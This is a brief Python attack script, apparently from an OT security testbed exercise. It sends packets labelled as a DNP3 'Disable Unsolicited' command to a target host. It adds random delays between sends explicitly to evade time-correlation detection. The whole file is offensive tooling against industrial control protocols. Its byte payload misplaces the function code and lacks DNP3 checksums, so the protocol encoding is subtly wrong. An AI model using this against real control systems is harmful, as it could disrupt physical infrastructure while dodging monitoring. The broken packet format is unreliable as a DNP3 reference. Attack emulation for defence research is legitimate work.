#!/usr/bin/env python3
import socket
import time
import argparse
import random

def send_dnp3_stealth(target_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Phase 2-2: DNP3 0x14 (Disable Unsolicited) packet signature (Magic bytes 0x05 0x64)
    # This represents a stealthy state-change command in OT.
    dnp3_payload = bytes([0x05, 0x64, 0x14, 0x0B, 0x00, 0x00, 0x00, 0x00])
    
    print(f"[*] Starting Phase 2-2 Asynchronous Stealth Attack against {target_ip}:{port}")
    
    for i in range(5):
        print(f"[{i+1}/5] Sending DNP3 0x14 payload...")
        sock.sendto(dnp3_payload, (target_ip, port))
        
        # Emulate time-lag stealth behavior
        delay = random.uniform(2.0, 5.0)
        print(f"      Sleeping for {delay:.2f}s to evade simple time-correlation...")
        time.sleep(delay)
        
    print("[+] Stealth attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phase 2-2 Asynchronous Stealth Attack")
    parser.add_argument("--ip", default="192.168.151.20", help="Target IP")
    parser.add_argument("--port", type=int, default=20000, help="Target Port")
    args = parser.parse_args()
    
    send_dnp3_stealth(args.ip, args.port)
